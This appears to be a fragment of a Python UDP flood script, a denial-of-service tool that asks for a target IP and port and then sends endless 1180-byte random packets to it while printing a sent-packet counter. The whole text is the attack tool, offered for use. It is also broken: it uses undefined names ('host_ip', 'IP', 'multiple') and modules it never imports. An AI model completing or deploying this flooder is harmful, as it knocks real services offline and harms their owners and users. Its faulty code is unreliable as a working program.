print("HANYA UNTUK UPTOBOY")
ip = str(input("IP: "))
port = str(input("PORT:"))

def udpflood():
    global req_code, error
    tar = (str(host_ip),int(port))
    bytes = random._urandom(1180) #1475
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            req_code += 1
            s.sendto(bytes,tar)
            sys.stdout.write("[+] UDP Flood | [" +IP+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
            try:
                for y in range(multiple):
                    s.sendto(bytes,tar)
                    req_code += 1
                    sys.stdout.write("[+] UDP Flood | [" +IP+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
                    sys.stdout.flush()
            except:
                try:
                    s.close()
                    error += 1
                except:
                    pass
        except:
            try:
                s.close()
                error += 1
            except:
                pass